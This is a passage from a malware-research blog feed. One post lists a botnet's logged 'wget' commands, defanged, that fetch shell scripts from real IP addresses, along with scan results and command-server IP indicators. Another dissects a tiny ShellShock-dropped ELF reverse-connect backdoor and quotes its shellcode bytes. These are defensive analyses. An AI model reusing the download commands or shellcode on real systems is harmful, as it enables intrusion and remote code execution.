208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-01 23:01:22 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-01 22:43:16 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-01 22:37:39 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 22:33:30 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-01 22:06:00 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 19:27:39 | wget hxxp:\/\/ 74.118.193.239\/bin . sh\u003Cbr \/\u003E2016-01-01 10:10:31 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 09:59:17 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 09:20:34 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-01 08:55:03 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-01 08:24:38 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 08:20:48 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 08:13:49 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 08:08:20 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 07:04:44 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 06:54:15 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 06:44:01 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 06:30:49 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 06:24:57 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 06:00:52 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 05:08:34 | wget ftx:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 04:36:17 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 04:24:38 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 04:10:30 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 03:26:20 | wget hxxp:\/\/ 89.248.162.171\/gtop . sh\u003Cbr \/\u003E2016-01-01 02:45:30 | wget hxxp:\/\/ 208.89.211.111\/bin . sh\u003Cbr \/\u003E2016-01-01 02:40:44 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-01 02:40:43 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-01 02:25:46 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 02:18:07 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-01 02:03:22 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-01 01:43:22 | wget hxxp:\/\/ 208.89.211.111\/bin . sh\u003Cbr \/\u003E2016-01-01 01:26:39 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-01 00:48:23 | wget hxxp:\/\/ 208.89.211.111\/bin . sh\u003Cbr \/\u003E2016-01-01 00:31:20 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-01 00:25:53 | wget ftx:\/\/ 208.67.1.52\/Binarys . sh\u003Cbr \/\u003E2016-01-01 00:17:39 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E6. Hosts up checked result (42 is up) \u003Cpre class=\"brush: js\"\u003E\u003Cbr \/\u003E-----------------------------------------------------------------\u003Cbr \/\u003EUpChecked: 70 IP addresses (42 hosts up) scanned in 24.34 seconds\u003Cbr \/\u003ESun Feb  7 12:37:12 #MalwareMustDie!\u003Cbr \/\u003E-----------------------------------------------------------------\u003Cbr \/\u003EScan report for \"biz.kcscleaning.net\" (107.172.23.133)\u003Cbr \/\u003E    Host is up, received reset ttl 48 (0.14s latency).\u003Cbr \/\u003EScan report for \"212.ip-158-69-205.net\" (158.69.205.212)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 48 (0.22s latency).\u003Cbr \/\u003EScan report for \"211.ip-158-69-217.net\" (158.69.217.211)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 48 (0.22s latency).\u003Cbr \/\u003EScan report for 162.208.8.203\u003Cbr \/\u003E    Host is up, received echo-reply ttl 53 (0.19s latency).\u003Cbr \/\u003EScan report for 162.213.195.144\u003Cbr \/\u003E    Host is up, received echo-reply ttl 50 (0.16s latency).\u003Cbr \/\u003EScan report for 173.208.196.202\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.17s latency).\u003Cbr \/\u003EScan report for 185.112.249.111\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.28s latency).\u003Cbr \/\u003EScan report for \"no.rdns.sharkservers.net\" (185.112.249.26)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.27s latency).\u003Cbr \/\u003EScan report for 185.130.5.200\u003Cbr \/\u003E    Host is up, received timestamp-reply ttl 49 (0.28s latency).\u003Cbr \/\u003EScan report for 185.17.30.239\u003Cbr \/\u003E    Host is up, received echo-reply ttl 50 (0.26s latency).\u003Cbr \/\u003EScan report for \"ip-9-253.dataclub.biz\" (185.29.9.253)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 47 (0.30s latency).\u003Cbr \/\u003EScan report for \"web.minsupport.net\" (185.52.2.114)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 52 (0.29s latency).\u003Cbr \/\u003EScan report for \"cacti.s42.voby.se\" (185.62.189.11)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 50 (0.26s latency).\u003Cbr \/\u003EScan report for \"www.AlphaNineVPS.com\" (192.227.170.67)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 46 (0.20s latency).\u003Cbr \/\u003EScan report for 192.243.109.128\u003Cbr \/\u003E    Host is up, received echo-reply ttl 53 (0.20s latency).\u003Cbr \/\u003EScan report for \"198-12-97-67-host.enwebhost.net\" (198.12.97.67)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 51 (0.18s latency).\u003Cbr \/\u003EScan report for \"198-23-238-203-host.enwebhost.net\" (198.23.238.203)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 51 (0.17s latency).\u003Cbr \/\u003EScan report for \"198-23-238-215-host.enwebhost.net\" (198.23.238.215)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 51 (0.17s latency).\u003Cbr \/\u003EScan report for \"198-23-238-251-host.enwebhost.net\" (198.23.238.251)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 51 (0.17s latency).\u003Cbr \/\u003EScan report for \"watchhere.docadvices.com\" (199.180.133.178)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 46 (0.15s latency).\u003Cbr \/\u003EScan report for \"mail10.sipanhost.com\" (199.231.184.237)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.22s latency).\u003Cbr \/\u003EScan report for \"lht194.cowanci.com\" (206.72.207.194)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.20s latency).\u003Cbr \/\u003ENmap scan report for 208.67.1.142\u003Cbr \/\u003E    Host is up, received echo-reply ttl 48 (0.19s latency).\u003Cbr \/\u003EScan report for \"sonypaio.com\" (208.73.207.236)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.26s latency).\u003Cbr \/\u003EScan report for \"server6.lega-helplineservice.com\" (208.89.211.111)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 46 (0.18s latency).\u003Cbr \/\u003EScan report for \"server.iceybinary.com\" (216.158.225.7)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 51 (0.12s latency).\u003Cbr \/\u003EScan report for 218.104.49.211\u003Cbr \/\u003E    Host is up, received echo-reply ttl 47 (0.091s latency).\u003Cbr \/\u003EScan report for 23.227.163.110\u003Cbr \/\u003E    Host is up, received echo-reply ttl 55 (0.15s latency).\u003Cbr \/\u003EScan report for \"host142-136-14-31.serverdedicati.aruba.it\" (31.14.136.142)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 47 (0.31s latency).\u003Cbr \/\u003EScan report for \"45.32.232.197.vultr.com\" (45.32.232.197)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 48 (0.38s latency).\u003Cbr \/\u003EScan report for 46.101.71.240\u003Cbr \/\u003E    Host is up, received echo-reply ttl 48 (0.28s latency).\u003Cbr \/\u003EScan report for \"test.interserver.net\" (64.20.33.134)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 49 (0.21s latency).\u003Cbr \/\u003EScan report for 80.82.64.177\u003Cbr \/\u003E    Host is up, received echo-reply ttl 52 (0.35s latency).\u003Cbr \/\u003EScan report for \"no-reverse-dns-configured.com\" (89.248.166.131)\u003Cbr \/\u003E    Host is up, received reset ttl 52 (0.36s latency).\u003Cbr \/\u003EScan report for 94.102.53.144\u003Cbr \/\u003E    Host is up, received echo-reply ttl 52 (0.37s latency).\u003Cbr \/\u003EScan report for \"no-reverse-dns-configured.com\" (94.102.63.136)\u003Cbr \/\u003E    Host is up, received echo-reply ttl 52 (0.34s latency).\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EStickyNote: Additional recent updates indicator (IP for infection panel or CNC)↓\u003C\/h2\u003E\u003Cpre class=\"brush: asm\"\u003E\/* Reformatted from previous embedded tweets *\/\u003Cbr \/\u003E\/* Sorted in chronological\/dates             *\/\u003Cbr \/\u003E\u003Cbr \/\u003E(Apr 10, 2015)\u003Cbr \/\u003E179.43.146.67 (added)\u003Cbr \/\u003E93.174.95.55\u003Cbr \/\u003E93.158.212.67\u003Cbr \/\u003E23.94.97.17\u003Cbr \/\u003E208.67.1.157\u003Cbr \/\u003E185.47.62.11\u003Cbr \/\u003E\u003Cbr \/\u003E(March 5, 2016)\u003Cbr \/\u003E217.20.164.167\u003Cbr \/\u003E208.67.1.91\u003Cbr \/\u003E208.67.1.193\u003Cbr \/\u003E45.32.232.197\u003Cbr \/\u003E52.91.23.21\u003Cbr \/\u003E63.142.254.55\u003Cbr \/\u003E\u003Cbr \/\u003E(March 4, 2016)\u003Cbr \/\u003E149.202.242.85\u003Cbr \/\u003E149.202.175.167\u003Cbr \/\u003E149.202.242.83\u003Cbr \/\u003E149.91.83.144\u003Cbr \/\u003E192.210.220.3\u003Cbr \/\u003E216.158.240.36\u003Cbr \/\u003E\u003Cbr \/\u003E(February 26, 2016)\u003Cbr \/\u003E93.115.97.75\u003Cbr \/\u003E89.248.162.167\u003Cbr \/\u003E\u003Cbr \/\u003E(February 25, 2016)\u003Cbr \/\u003E208.67.1.180\u003Cbr \/\u003E172.245.104.175\u003Cbr \/\u003E23.94.27.117\u003Cbr \/\u003E198.23.238.215\u003Cbr \/\u003E208.67.1.46\u003Cbr \/\u003E208.67.1.180\u003Cbr \/\u003E192.151.158.66\u003Cbr \/\u003E\u003Cbr \/\u003E(up to February 15, 2016)\u003Cbr \/\u003E185.11.146.191\u003Cbr \/\u003E185.11.146.151\u003Cbr \/\u003E185.62.190.62\u003Cbr \/\u003E185.62.190.82\u003Cbr \/\u003E185.62.190.156\u003Cbr \/\u003E185.62.190.222\u003Cbr \/\u003E185.62.190.253\u003Cbr \/\u003E188.209.49.163\u003Cbr \/\u003E188.209.52.195\u003Cbr \/\u003E188.209.49.131\u003Cbr \/\u003E188.209.49.165\u003Cbr \/\u003E185.130.5.165\u003Cbr \/\u003E185.130.5.174\u003Cbr \/\u003E185.130.5.200\u003Cbr \/\u003E185.130.5.205\u003Cbr \/\u003E185.130.5.246\u003Cbr \/\u003E80.82.64.177\u003Cbr \/\u003E80.82.78.12\u003Cbr \/\u003E89.248.168.29\u003Cbr \/\u003E89.248.172.201\u003Cbr \/\u003E94.102.53.144\u003Cbr \/\u003E89.248.162.167\u003Cbr \/\u003E89.248.162.171\u003Cbr \/\u003E89.248.166.131\u003Cbr \/\u003E89.248.168.39\u003Cbr \/\u003E89.248.172.166\u003Cbr \/\u003E89.248.172.173\u003Cbr \/\u003E94.102.49.197\u003Cbr \/\u003E94.102.63.136\u003Cbr \/\u003E46.165.251.153\u003Cbr \/\u003E178.162.199.88\u003Cbr \/\u003E178.162.205.4\u003Cbr \/\u003E178.162.205.29\u003Cbr \/\u003E178.162.205.30\u003Cbr \/\u003E178.162.211.200\u003Cbr \/\u003E178.162.211.211\u003Cbr \/\u003E178.162.211.213\u003Cbr \/\u003E178.162.211.214\u003Cbr \/\u003E178.162.211.215\u003Cbr \/\u003E178.162.211.216\u003Cbr \/\u003E178.162.211.217\u003Cbr \/\u003E\u003Cbr \/\u003E(February 13, 2016)\u003Cbr \/\u003E149.202.153.56\u003Cbr \/\u003E173.208.196.202\u003Cbr \/\u003E188.0.236.27\u003Cbr \/\u003E188.209.52.228\u003Cbr \/\u003E192.210.220.3\u003Cbr \/\u003E198.23.238.215\u003Cbr \/\u003E198.23.238.251\u003Cbr \/\u003E208.67.1.130\u003Cbr \/\u003E208.67.1.33\u003Cbr \/\u003E208.69.31.11\u003Cbr \/\u003E5.152.206.162\u003Cbr \/\u003E5.196.8.171\u003Cbr \/\u003E89.248.162.167\u003Cbr \/\u003E\u003C\/pre\u003E  \u003Cp\u003E\u003Ch2\u003ENotes:\u003C\/h2\u003E \u003Cp\u003EThank you for the friends who contributed much for this data, and the willing to share to prevent infections getting out of control.\u003Cbr\u003E \u003Cp\u003EJust for LOL, thank's for FREE promotion of \u003Ca href=\"http:\/\/www.malwaremustdie.org\"\u003EMalwareMustDie.ORG\u003C\/a\u003E, skiddies :))\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-3gwDomqEOOY\/Vw-FgXv60sI\/AAAAAAAAUt8\/bQvubkFy1Yw65hZB7QwK4p1AxdRPLieIwCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-3gwDomqEOOY\/Vw-FgXv60sI\/AAAAAAAAUt8\/bQvubkFy1Yw65hZB7QwK4p1AxdRPLieIwCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E   \u003Ccenter\u003E\u003Cp\u003E\u003Ch2\u003EWe have a much better KungFu than yours kiddo :)\u003C\/h2\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_X7h2pMQdrU\/VexDK6gC-iI\/AAAAAAAATJQ\/EuSfltvvjrsp8u7E6H7wRtGSx956QN0nACCo\/s600-Ic42\/KillBillJunior1.gif\u003E \u003Cp\u003E#MalwareMustDie! \u003C\/center\u003E \u003Cbr\u003E\u003Ci\u003E\u003Cp\u003E\u003Cpre\u003E\u003Cbr \/\u003EFear thou not; \u003Cbr \/\u003Efor I [am] with thee: be not dismayed; \u003Cbr \/\u003Efor I [am] thy God: I will strengthen thee; \u003Cbr \/\u003Eyea, I will help thee; \u003Cbr \/\u003Eyea, I will uphold thee with the right hand of my righteousness.\u003Cbr \/\u003E\u003Cbr \/\u003E☩Isaiah 41:10  \u003C\/pre\u003E\u003C\/i\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/5845015848247955812\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/02\/mmd-0052-2016-skidddos-elf-distribution.html#comment-form","title":"1 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5845015848247955812"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5845015848247955812"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/02\/mmd-0052-2016-skidddos-elf-distribution.html","title":"MMD-0052-2016 - Overview of \"SkidDDoS\" ELF++ IRC Botnet"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-PvX1OUPiYl4\/Vw6AdkoNTbI\/AAAAAAAAUrw\/68ICw660p1IIDEy7b830KY0jKBGZ-n4swCLcB\/s72-c\/Capture.PNG","height":"72","width":"72"},"thr$total":{"$t":"1"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-1470586720159709174"},"published":{"$t":"2016-02-03T01:33:00.002-08:00"},"updated":{"$t":"2016-02-05T17:34:53.997-08:00"},"title":{"type":"text","$t":"MMD-0051-2016 - Debunking a tiny ELF remote backdoor (shellcode shellshock part 2)"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cp\u003EIn September 2014 during the \u003Cb\u003EShellShock\u003C\/b\u003E exploitation was in the rush I analyzed a case (MMD-0027-2014) of an ELF dropped payload via \u003Cb\u003EShellShock\u003C\/b\u003E attack, with the details can be read in--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/09\/linux-elf-bash-0day-fun-has-only-just.html\"\u003Ehere\u003C\/a\u003E]  \u003Cp\u003EToday I found an interesting ELF x86-32 sample that was reported several hours back, the infection vector is also via \u003Cb\u003EShellShock\u003C\/b\u003E, the reporter seems not so sure whether the ELF binary is malicious or not..nor can he figure which kind of malware it is.. if it's malicious, so I decided to dissect it upon received the sample, hoping this information will help security community to use it as reference for the similar case.   \u003Cp\u003EThe ELF binary looks like this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vJXABVefvYc\/VrH7SiU8mcI\/AAAAAAAAUV0\/W9HmlIk4pXk\/s5103\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vJXABVefvYc\/VrH7SiU8mcI\/AAAAAAAAUV0\/W9HmlIk4pXk\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EIt is a statically compiled 155 bytes ELF binary in Intel 32bit architecture, by the result of its compilation I can tell that was in a form of shellcode for linux compiled in C template on a GCC compiler.  \u003Cp\u003E\u003Ch2\u003EStudying the sample\u003C\/h2\u003E \u003Cp\u003EAs I fond of shellcode myself as a hobby, seeing the hex and stripping the ELF header parts, I can see the shellcode inside started from  \u003Cb\u003E\u003Cfont color=red\u003E31 db f7 e3  53 43 53 6a 02 b0 66\u003C\/b\u003E\u003C\/font\u003E ..until.. \u003Cfont color=red\u003E\u003Cb\u003Ecd  80 ff e1\u003C\/b\u003E\u003C\/font\u003E.   \u003Cp\u003ECompared to the previous mentioned case, this shellcode is a way much shorter, could be part of something bigger that was cut to whatever purpose, or a partial module of the threat series, or it's just small. Anyhow I decided to check it out, and of course, with my beloved \u003Ci\u003Eradare\u003C\/i\u003E. Firing up, it looks plain and simple assembly as per below, as per disassembled which each opcodes correctly in 80386(x86-32) machine language:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/--MOiuaffXAk\/VrG6nxNNhYI\/AAAAAAAAUUk\/O2HAqKGCgwQ\/s5120\/002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/--MOiuaffXAk\/VrG6nxNNhYI\/AAAAAAAAUUk\/O2HAqKGCgwQ\/s580\/002.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIn a glimpse, this shellcode looks the same to what we had before, but it is slightly different on several patys and again, shorter. So now all we have to do is to describe how dos it work.  \u003Cp\u003E\u003Ch2\u003EDissection of the evil opcodes\u003C\/h2\u003E \u003Cp\u003EI breakdown the codes into its calls \u0026 processes, took a while of work and reading many syscall references, but it was all worth and the result is as per pictured below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WgU5uF_bWXM\/VrG-mxQsw6I\/AAAAAAAAUU0\/oWudXUdtKQg\/s5120\/003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WgU5uF_bWXM\/VrG-mxQsw6I\/AAAAAAAAUU0\/oWudXUdtKQg\/s580\/003.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EWhat it says from line number 3 to 25 (xref: \u003Ci\u003E0x08048054 \u003C\/i\u003Eto \u003Ci\u003E0x0804807a\u003C\/i\u003E) in plain English is:  \u003Cbr\u003EFirstly this ELF\/shellcode part called the \u003Ci\u003Esocket\u003C\/i\u003E, set it with as internet connection used socket \u003Ci\u003E(PF_INET)\u003C\/i\u003E to a certain \u003Ci\u003EIP address\u003C\/i\u003E and \u003Ci\u003Eport number\u003C\/i\u003E (both are hard coded in hex, see the picture above), assuming \u003Cb\u003E\u003Ci\u003Ethe back connection\u003C\/i\u003E\u003C\/b\u003E is going to being made \u003Cb\u003E\u003Ci\u003Eto the remote machine\u003C\/i\u003E\u003C\/b\u003E. I see the same procedure is used in same \u003Cb\u003Ereverse-shell malware\u003C\/b\u003E or some \u003Cb\u003Emalicious shellcode\u003C\/b\u003E itself. This part is happened more or less \u003Ci\u003Esimilar \u003C\/i\u003Eas previous case I reported and dissected in September 2014 (linked above).  \u003Cp\u003EHowever, the rest of the lines is the \u003Cb\u003Einteresting point \u003C\/b\u003Eof this threat.  \u003Cp\u003Ein \u003Ci\u003E0x0804807c \u003C\/i\u003Eit strictly set the memory space (in the stack) to the value of 7, and this can be only mean that the stack setting(\u003Ci\u003EPROT_READ\u003C\/i\u003E, \u003Ci\u003EPROT_WRITE\u003C\/i\u003E, \u003Ci\u003EPROT_EXEC\u003C\/i\u003E) flag is set to \u003Cb\u003Ereadable\u003C\/b\u003E, \u003Cb\u003Ewriteable \u003C\/b\u003Eand \u003Cb\u003Eexecutable \u003C\/b\u003E( xref: codes from \u003Ci\u003E0x0804807e \u003C\/i\u003Eto \u003Ci\u003E0x0804808d \u003C\/i\u003Eis all about this setting..called syscall \u003Ci\u003Esys_mmap2\u003C\/i\u003E w\/def size 4096 and called syscall \u003Ci\u003Esys_mprotect\u003C\/i\u003E..in C is  similar to make a  \u003Ci\u003Emalloc()\u003C\/i\u003E part).  \u003Cp\u003E Up to this point the badness is smelled stronger. The next codes will explain its bad activity very well. In \u003Ci\u003E0x0804808f \u003C\/i\u003Eit restores the \u003Ci\u003Esocket \u003C\/i\u003Eand then reads the data from the \u003Ci\u003Esocket \u003C\/i\u003E(ref \u003Ci\u003E0x08048095 \u003C\/i\u003Ein executed syscall0x03 \u003Ci\u003Esys_read\u003C\/i\u003E) and it's saved the data to the stack (which is \u003Cb\u003Eread\/write\/exec-able\u003C\/b\u003E now). \u003Cbr\u003EThe described current process is up to \u003Ci\u003E0x08048097 \u003C\/i\u003Enow (we are here). So, an explanation in better English up to this process is: this malware connects to the defined IP address and port and listened to what will be sent and save the sent data in the memory.  \u003Cp\u003EThe next, the last code is in address \u003Ci\u003E0x08048099 \u003C\/i\u003Eis a \u003Ci\u003Ejump command\u003C\/i\u003E to \u003Cb\u003Eecx register\u003C\/b\u003E which contains the pointer to the saved data in she stack, Yes, which can also mean \u003Cb\u003Ethe execution\u003C\/b\u003E of the whatever data saved in the allocated stack (memory).  \u003Cfont color=red\u003E\u003Cp\u003EIn overall, in short; this backdoor is back-connecting to a hardcoded remote host, it listens to the connected socket and retrieving the data sent through it, and saved the data in the stack (memory), and to then it can execute whatever form of executable data sent to the infected host.\u003C\/font\u003E \u003Cbr\u003EAnd all of these can be performed in a \u003Ci\u003Etiny-savvy-little\u003C\/i\u003E \u003Cb\u003E155 bytes ELF file\u003C\/b\u003E we have, nasty is it? To be clear, it doesn't fetch any binary, it doesn't contain any shell. as engineer one should be precise in defining this malicious definition.  \u003Cp\u003EThe implementation for this backdoor can be widely applied as component to many further form of badness if it s installed\/sent to any successful compromised host. We'd better to take more attention awareness of these type of small and unusual ELF files inside of our system.   \u003Cp\u003EThe most commonly imaginable follow-up scheme for this ELF infection is the injection of the shell binary (mostly an \"sh\" or \"bash\" file, etc) ELF binary via this backdoor. But that is not necessarily to be the shell binary. IT can be rootkit installer or further malicious shellcode.  \u003Cp\u003EThe threat is already in the wild folks, before you yell me of the OPSEC I'd say \u003Cb\u003Eawareness is a must too!!\u003C\/b\u003E, there is no need to be \u003Ci\u003Ehush hush \u003C\/i\u003Eabout this matter which making our fellow sysadmins clueless (like a friend who got this in his server) and doesn't know much info about this threat. They are the ones who can lose their jobs for not knowing these details, They need to know the correct definition.  \u003Cp\u003E\u003Ch2\u003EBehavior analysis\u003C\/h2\u003E \u003Cp\u003EDuring the \"run\" process, sysadmins in any infected machine will see some operations triggered by the malware in the kernel space as per processed called below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1poRSn1anVA\/VrH8ozWGrSI\/AAAAAAAAUWI\/qWbU1211UBc\/s4494\/005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1poRSn1anVA\/VrH8ozWGrSI\/AAAAAAAAUWI\/qWbU1211UBc\/s500\/005.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAnd of course, in this particular file, due to the stupidity of the lamer who copy-pasta and wrongly compiled its codes, the segmentation fault will occur for the obvious silly reason, which I will not explain in here for the security reason.    \u003Cp\u003E\u003Ch2\u003ENaming of the malware\u003C\/h2\u003E \u003Cp\u003EI must protest to antiviruses that was saying this is as a \u003Cb\u003E\"downloader\"\u003C\/b\u003E, since clearly there is no direct\/undirect downloading codes in its binary. The correct fact is, \u003Cb\u003Ea backdoor\u003C\/b\u003E, with the malicious verdict of: a remote attacker is pushing via TCP the binary to be executed in the compromised machine via this backdoor .  \u003Cp\u003EOther antivirus products named this malware with \"GetShell\", ...umm..well... it is \u003Ci\u003Eabout okay\u003C\/i\u003E, since \"mostly\" what will be pushed via this backdoor are shell binaries, \u003Cb\u003Ebut noted: \u003C\/b\u003Ethis malware \u003Ci\u003Eis NOT making any GET action\u003C\/i\u003E to receive that binary, it is just sitting there connecting to an IP and waiting for the push. Moreover.. \u003Ci\u003Ethe payload \u003C\/i\u003E itself doesn't have to be a \u003Ci\u003Eshell binary\u003C\/i\u003E either, could be a rootkit for example, or etc badness installer, and so on..  \u003Cp\u003EFor those antivirus products that named this malware as \"ShellLoader\"..sorry, it is just \u003Cb\u003Etoo different in meaning\u003C\/b\u003E, firstly, the binary \u003Cb\u003Eis NOT loading anything\u003C\/b\u003E except itself, and there is no single shell is loaded too, furthermore, there is a \u003Ci\u003Eshellloader \u003C\/i\u003EELF malware which is operated differently to this one, let's not mixing them, and please, \u003Cb\u003Edo not suggest a wrong assumption\u003C\/b\u003E to your market or customers, educate them with real technical fact instead! Come on, you can do better than this!  \u003Cp\u003ECongratulations to ONE product who named this correctly, you did a good work! A hat tip!\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-sRl0lXnVjZs\/VrH5YxK4NWI\/AAAAAAAAUVo\/mE7JFb1OTYw\/s4120\/007.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sRl0lXnVjZs\/VrH5YxK4NWI\/AAAAAAAAUVo\/mE7JFb1OTYw\/s500\/007.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003ESometimes it takes efforts to explain what actual names for this malware :-)\u003Cbr\u003EFYI, this is only 155 bytes of codes, lesser of that size is in shellcode bytes, mustn't be that hard to be read, specially with a good resources, manpower and budget.  \u003Cp\u003EI am a field fellow, I work from IDC to IDC, servers to servers, even now, my mates are all sysadmins and I am one of them, a NIX admin for 20+ years experience now, and I know them very well. And UNIX sysadmins CAN NOT AFFORD TO MAKE ANY MISTAKE, and yes, we don't. Services and daemons work are depending on us.  For us, everything related to an incident like this, is \u003Ci\u003Etechnical\u003C\/i\u003E, and we depend and \u003Ci\u003Etrust the technical outcome\u003C\/i\u003E, like the names of the malware, is the first result we will see, and \u003Cb\u003Esysadmin's actions will be based on those names after AntiVirus scanned it\u003C\/b\u003E (if they installed it), this is why some of us paying license fee to AntiVirus yearly, and they (AV) should not making wrong judgement nor just do a pattern matching checks only for naming a ELF malware, especially for this tiny small dangerous stuff!!  \u003Cp\u003EWhen I speak the truth advising right information  and name of this malware \u0026 showing some bad namings as the output of virus cannning, what I got is a \u003Cb\u003E\"WHAT?\"\u003C\/b\u003E from a \u003Ci\u003E\"younger\"\u003C\/i\u003E friend in an \u003Ci\u003E\"industry\"\u003C\/i\u003E :-(\u003Cbr\u003EObviously there is no respect of the efforts of what has been done here.. :-|\u003Cbr\u003EREAD THE CODES, Bro, your SERVER SIDE customers in the field are REALLY counting on your skill in naming of ELF malware, \u003Cb\u003EUNIX servers are not a PC\u003C\/b\u003E in its management. And again, \u003Cb\u003Epeople like us are losing jobs\u003C\/b\u003E for the hacking incident like this, while AV may \"only\" lose some numbers of income from a 